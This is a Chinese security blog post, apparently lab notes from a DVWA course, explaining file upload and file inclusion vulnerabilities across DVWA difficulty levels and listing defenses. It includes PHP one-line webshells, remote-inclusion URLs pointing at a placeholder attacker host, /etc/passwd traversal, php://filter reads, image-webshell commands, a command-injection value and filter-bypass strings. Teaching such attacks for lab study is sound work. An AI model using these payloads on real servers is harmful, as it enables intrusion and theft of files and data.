@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web 安全：文件上传与文件包含 · pressure-J</title>
+<meta name="description" content="一句话原理：文件上传功能把用户上传的文件直接存进 Web 可访问目录，且不校验文件内容。PHP/JSP 等可执行文件一进入 Web 目录，攻击者访问它，服务器就按&quot;程序&quot;解析执行——一个 webshell（网页后门）就此诞生。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-an-quan-wen-jian-shang-chuan-yu-wen-jian-bao-han.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web 安全：文件上传与文件包含 · pressure-J">
+<meta property="og:description" content="一句话原理：文件上传功能把用户上传的文件直接存进 Web 可访问目录，且不校验文件内容。PHP/JSP 等可执行文件一进入 Web 目录，攻击者访问它，服务器就按&quot;程序&quot;解析执行——一个 webshell（网页后门）就此诞生。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web 安全：文件上传与文件包含</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-08-28">2026-08-28</time>
+          <span>4617 字</span>
+          <span>约 12 分钟</span>
+        </div>
+        
+      </header>
+      <div class="content"><blockquote>
+<p>来源：课程实验《文件上传与包含攻击》（DVWA 平台 + 中国蚁剑，2025-2026 第二学期），以课件详细版（18 页实验指导）为主<br />
+定位：GetShell（拿到服务器权限）最经典的两条链路，护网/红队/CTF 高频考点，面试必问<br />
+实战场景：一切有上传功能的站点（头像、附件、编辑器）；一切带 <code>page=</code>、<code>file=</code>、<code>template=</code> 参数的页面</p>
+</blockquote>
+<hr />
+<h2 id="_1">一、原理概述</h2>
+<h3 id="_2">文件上传漏洞：信任了不该信任的东西</h3>
+<p><strong>一句话原理</strong>：文件上传功能把用户上传的文件<strong>直接存进 Web 可访问目录</strong>，且不校验文件内容。PHP/JSP 等可执行文件一进入 Web 目录，攻击者访问它，服务器就按"程序"解析执行——一个 <code>webshell</code>（网页后门）就此诞生。</p>
+<p><strong>为什么能执行</strong>：Web 服务器的职责是"收到 HTTP 请求 → 按扩展名和路径决定是返回静态内容还是执行脚本"。<code>.php</code> 文件落在 Web 根目录内 → 服务器执行它 → 里面的 PHP 代码就是攻击者写在文件里的代码。上传功能等于"帮攻击者把代码放到了能执行它的地方"。</p>
+<h3 id="include">文件包含漏洞：include 把参数当文件</h3>
+<p><strong>一句话原理</strong>：后端用 <code>include($file)</code> 之类的方式动态加载文件，而 <code>$file</code> 来自用户参数（如 <code>?page=xxx</code>）。包含进来文件里的 <strong>PHP 代码会被无条件执行</strong>，纯文本会被原样输出。</p>
+<p><strong>为什么危险</strong>（包含点 + 可控参数 = 漏洞）：<br />
+- <strong>本地包含 LFI</strong>：<code>?page=../../etc/passwd</code> → 读到服务器任意文件；<code>file://</code> 协议读文件<br />
+- <strong>远程包含 RFI</strong>：<code>?page=http://攻击者IP/evil.txt</code> → 服务器去远程把文件拉回来执行，等于远程投递 webshell<br />
+- <strong>伪协议</strong>：<code>php://filter</code> 不执行只读源码、<code>data://</code> 直接内联代码——把"不可能上传文件"变成"不落地执行代码"</p>
+<hr />
+<h2 id="_3">二、核心知识</h2>
+<h3 id="_4">一句话木马与蚁剑（实验核心工具链）</h3>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span> <span class="o">@</span><span class="nb">assert</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])</span> <span class="cp">?&gt;</span><span class="x">          &lt;!-- 过 WAF 变体 --&gt;</span>
+<span class="cp">&lt;?php</span> <span class="nb">fputs</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">'evil.php'</span><span class="p">,</span><span class="s1">'w'</span><span class="p">),</span><span class="s2">"&lt;?php @eval(</span><span class="se">\$</span><span class="s2">_POST['file']);?&gt;"</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">  &lt;!-- 自写马 --&gt;</span>
+</code></pre></div></div>
+
+<p><strong>原理</strong>：<code>eval()</code> 把 POST 参数 <code>file</code> 的值<strong>当作 PHP 代码执行</strong>。蚁剑（AntSword）连接时：右键添加数据 → URL 填木马地址（如 <code>http://IP/DVWA/hackable/uploads/ws.php</code>）→ 密码填 <code>file</code> → 连接。此后蚁剑界面上的每个操作（看文件、执行命令）都被转换成 POST 请求发给木马，由服务器上的 PHP 执行。<strong>木马是"窗口"，蚁剑是"操作员"。</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>校验点</th>
+<th>Low</th>
+<th>Medium</th>
+<th>High</th>
+<th>Impossible</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>扩展名</td>
+<td>不查</td>
+<td>不查</td>
+<td>白名单 jpg/jpeg/png</td>
+<td>白名单 + 随机重命名</td>
+</tr>
+<tr>
+<td>MIME/Content-Type</td>
+<td>不查</td>
+<td>查 <code>image/jpeg</code>/<code>image/png</code></td>
+<td>不查</td>
+<td>查</td>
+</tr>
+<tr>
+<td>文件头 getimagesize</td>
+<td>不查</td>
+<td>不查</td>
+<td>查</td>
+<td>查</td>
+</tr>
+<tr>
+<td>内容</td>
+<td>不查</td>
+<td>不查</td>
+<td>不查</td>
+<td><strong>图片重编码</strong>（剥壳）</td>
+</tr>
+<tr>
+<td>CSRF token</td>
+<td>无</td>
+<td>无</td>
+<td>无</td>
+<td>有</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="_5">文件包含方式速查</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>形式</th>
+<th>示例</th>
+<th>效果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>远程包含</td>
+<td><code>?page=http://攻击者IP/evil.txt</code></td>
+<td>服务器拉远程文件并执行（需 <code>allow_url_include=On</code>）</td>
+</tr>
+<tr>
+<td>本地包含</td>
+<td><code>?page=../../../../etc/passwd</code></td>
+<td>读取本地任意文件（PHP 代码则执行）</td>
+</tr>
+<tr>
+<td>file 协议</td>
+<td><code>?page=file:///etc/passwd</code></td>
+<td>强制按文件读，绕过 HTTP 限制</td>
+</tr>
+<tr>
+<td>伪协议</td>
+<td><code>?page=php://filter/convert.base64-encode/resource=index.php</code></td>
+<td>不执行直接读源码（base64 输出）</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_6">三、实操/利用流程（方法论）</h2>
+<h3 id="shell">文件上传拿 Shell 四步</h3>
+<ol>
+<li><strong>探测</strong>：随便传一个 <code>.php</code> 测试文件，看是否上传成功、被存到哪里（响应会回显路径）</li>
+<li><strong>投毒</strong>：上传一句话木马（替换内容再传）</li>
+<li><strong>连接</strong>：蚁剑添加数据连接木马 URL</li>
+<li><strong>站稳</strong>：文件管理 → 读敏感文件（<code>/etc/passwd</code>、配置文件）、命令执行 → 找提权点</li>
+</ol>
+<h3 id="shell-rfi">文件包含拿 Shell 四步（RFI 思路）</h3>
+<ol>
+<li><strong>发现包含点</strong>：URL 出现 <code>?page=file1.php</code> 这类参数 → 参数可换 = 可控</li>
+<li><strong>准备恶意文件</strong>：在<strong>攻击者自己的服务器</strong>上放一个 <code>.txt</code>（后缀不能是 .php，否则被攻击者服务器先执行了），内容为写马代码：<code>&lt;?php fputs(fopen('evil.php','w'),"&lt;?php @eval(\$_POST['file']);?&gt;");?&gt;</code></li>
+<li><strong>触发</strong>：<code>?page=http://攻击者IP/remotefileinclusion.txt</code> → 目标服务器拉回该文件执行 → 在目标路径下生成 <code>evil.php</code></li>
+<li><strong>连接</strong>：蚁剑连接 <code>evil.php</code>。写目录没有权限时，改写到 <code>hackable/uploads/</code> 这类已知可写目录</li>
+</ol>
+<hr />
+<h2 id="dvwa">四、绕过与进阶（DVWA 各级别）</h2>
+<h3 id="medium">上传：Medium —— 只查客户端报的类型</h3>
+<p>后端校验 <code>$_FILES['uploaded']['type']</code> 必须是 jpeg/png。<strong>这是客户端告诉服务器的内容，抓包就能改</strong>：Burp 拦截上传请求 → 把 <code>Content-Type: application/x-php</code> 改成 <code>image/png</code> → 放行 → 上传成功。<strong>教训：<code>type</code> 字段是"客户端申报值"，永远不可信，必须由服务端自己检测内容。</strong></p>
+<h3 id="high">上传：High —— 扩展名白名单 + 文件头校验</h3>
+<ul>
+<li>校验点变成：文件名的最后一个扩展名必须是 jpg/jpeg/png <strong>且</strong> <code>getimagesize()</code> 能读出图片信息（读不到就报错）</li>
+<li><strong>图片马制作</strong>（把木马"藏"进图片）：</li>
+<li>Linux：<code>cat a.png a.php &gt; b.png</code>（两个文件按二进制拼接）</li>
+<li>Windows CMD：<code>copy a.png/b + a.php/a b.png</code>（<code>/b</code> 二进制 <code>/a</code> 文本）</li>
+<li>上传 <code>b.png</code> 成功，但蚁剑连不上——<strong>因为<code>.png</code> 扩展名让服务器把它当图片返回，不是当 PHP 执行</strong></li>
+<li><strong>两条激活路径</strong>（把"图片"变成"程序"）：<br />
+  1. <strong>命令注入配合</strong>：利用之前实验的命令注入，<code>127.0.0.1;cp ../../hackable/uploads/b.png ../../hackable/uploads/b.php</code> 复制出 <code>.php</code> 副本 → 可连接<br />
+  2. <strong>文件包含配合</strong>：<code>?page=file:///var/www/html/DVWA/hackable/uploads/b.png</code> 强制按 PHP 解析执行 → 蚁剑连接时（浏览器 F12 复制 Cookie 带上）成功</li>
+<li><strong>本质</strong>：每一种校验都能被组合拳绕过——扩展名卡住了就改内容，内容卡住了就找执行入口。<strong>上传漏洞往往是"上传+包含/命令注入"多漏洞组合利用。</strong></li>
+</ul>
+<h3 id="medium-str_replace">包含：Medium —— str_replace 双写绕过</h3>
+<p>过滤 <code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code>，但 <code>str_replace</code> 是<strong>一次性的无状态替换</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>htthttp://p:// → 替换 http:// 后剩 p:// → 拼起来恰好 htt[p://]... 
+</code></pre></div></div>
+
+<p>构造 <code>?page=htthttp://p://目标IP/evil.txt</code> —— 过滤吃掉中间的 <code>http://</code>，剩下的 <code>http://</code> 原样生效。目录穿越同理：<code>....//</code> → 吃掉中间的 <code>../</code> → 剩 <code>../</code>。<strong>黑名单替换天然可被"双写"破，这是 str_replace 系过滤的通用死穴。</strong></p>
+<h3 id="high-fnmatch-rfi-lfi">包含：High —— fnmatch 白名单，RFI 死路转 LFI</h3>
+<p><code>!fnmatch("file*", $file)</code> 要求参数必须以 <code>file</code> 开头 → 远程包含彻底堵死。但本地包含仍然成立：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>?page=file:///etc/passwd              → 读系统文件
+?page=file:/../../../phpinfo.php      → 相对当前目录（fi/ 下）穿越到 phpinfo.php
+</code></pre></div></div>
+
+<p><strong>LFI 永远比 RFI 难防</strong>：不需要远程服务器，一个 <code>file://</code> 就能读服务器任意文件。</p>
+<h3 id="impossible">Impossible：为什么防住了</h3>
+<p>扩展名白名单 + 大小/类型/文件头全查 + <strong>md5(uniqid()) 随机重命名</strong>（攻击者无法预测存储路径）+ <strong>图片重编码</strong>（把图片用 GD 库重新生成，木马内容被剥离）+ Anti-CSRF token。<strong>链路上每一个环节都断掉</strong>，这才是纵深防御的样子。</p>
+<hr />
+<h2 id="_7">五、防御（面试必答，对应原理）</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>攻击点</th>
+<th>防御</th>
+<th>对应原理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>可执行文件入库</td>
+<td><strong>扩展名白名单</strong> + <strong>随机化存储文件名</strong>（md5/时间戳，不保留原名）</td>
+<td>从源头排除脚本扩展名；路径不可预测，即使传上去也无法定位</td>
+</tr>
+<tr>
+<td>内容伪造</td>
+<td>服务端检测：<code>getimagesize()</code> + <strong>图片重编码</strong>（重新生成图片剥壳）</td>
+<td>不信任客户端申报的 type，实际解析文件内容</td>
+</tr>
+<tr>
+<td>脚本被执行</td>
+<td><strong>上传目录禁止执行脚本</strong>（<code>.htaccess</code> 禁 php、Nginx <code>location ~ \.php</code> 排除 uploads）</td>
+<td>Web 服务器层面切断"执行"这一环</td>
+</tr>
+<tr>
+<td>包含任意文件</td>
+<td><strong>白名单文件列表</strong>（只能包含指定的几个文件）</td>
+<td>最优解：根本不让参数决定包含谁</td>
+</tr>
+<tr>
+<td>远程包含</td>
+<td><code>allow_url_include=Off</code>（php.ini）</td>
+<td>关闭 HTTP 拉取文件的能力</td>
+</tr>
+<tr>
+<td>任意文件读取</td>
+<td><code>open_basedir</code> 限制 PHP 可访问目录范围</td>
+<td>即使 LFI 成功，也读不出目录外文件</td>
+</tr>
+<tr>
+<td>权限</td>
+<td>Web 目录最小写权限；上传目录与被包含目录分离编剧</td>
+<td>降低被写马、被读取的面</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_8">六、面试速答卡</h2>
+<ul>
+<li><strong>上传漏洞的本质</strong>：可执行文件被放进 Web 可访问目录且无内容校验</li>
+<li><strong>一句话木马原理</strong>：<code>eval($_POST['file'])</code> 把 POST 内容当 PHP 代码执行</li>
+<li><strong>MIME 校验为什么能绕过</strong>：<code>Content-Type</code> 是客户端申报值，抓包随便改</li>
+<li><strong>图片马怎么做</strong>：<code>cat 图片 木马 &gt; 新图片</code>，文件头是图片但尾部有代码；用包含/命令注入激活</li>
+<li><strong>LFI 和 RFI 区别</strong>：包含本地文件 vs 包含远程 URL 文件；RFI 需 <code>allow_url_include</code>，LFI 更常见</li>
+<li><strong>str_replace 绕过</strong>：双写 <code>htthttp://p://</code>、<code>....//</code>，替换后重新拼接成合法内容</li>
+<li><strong>包含漏洞拿 Shell 的链</strong>：写马 txt（远程）→ RFI 触发生成 php → 蚁剑连接</li>
+<li><strong>最有效防御</strong>：白名单 + 随机重命名 + 上传目录禁执行 + 包含白名单列表</li>
+</ul></div>
+      <div class="post-nav"><a class="pn-item prev" href="web-an-quan-luo-ji-lou-dong-yu-ssrf.html"><span>← 上一篇</span><strong>Web 安全：逻辑漏洞与 SSRF</strong></a><a class="pn-item next" href="linux-jin-jie-nei-he-bian-yi-yu-nei-he-mo-kuai.html"><span>下一篇 →</span><strong>Linux 进阶：内核编译与内核模块</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">一、原理概述</a><a href="#_2" class="toc-lv3">文件上传漏洞：信任了不该信任的东西</a><a href="#include" class="toc-lv3">文件包含漏洞：include 把参数当文件</a><a href="#_3" class="toc-lv2">二、核心知识</a><a href="#_4" class="toc-lv3">一句话木马与蚁剑（实验核心工具链）</a><a href="#_5" class="toc-lv3">文件包含方式速查</a><a href="#_6" class="toc-lv2">三、实操/利用流程（方法论）</a><a href="#shell" class="toc-lv3">文件上传拿 Shell 四步</a><a href="#shell-rfi" class="toc-lv3">文件包含拿 Shell 四步（RFI 思路）</a><a href="#dvwa" class="toc-lv2">四、绕过与进阶（DVWA 各级别）</a><a href="#medium" class="toc-lv3">上传：Medium —— 只查客户端报的类型</a><a href="#high" class="toc-lv3">上传：High —— 扩展名白名单 + 文件头校验</a><a href="#medium-str_replace" class="toc-lv3">包含：Medium —— str_replace 双写绕过</a><a href="#high-fnmatch-rfi-lfi" class="toc-lv3">包含：High —— fnmatch 白名单，RFI 死路转 LFI</a><a href="#impossible" class="toc-lv3">Impossible：为什么防住了</a><a href="#_7" class="toc-lv2">五、防御（面试必答，对应原理）</a><a href="#_8" class="toc-lv2">六、面试速答卡</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
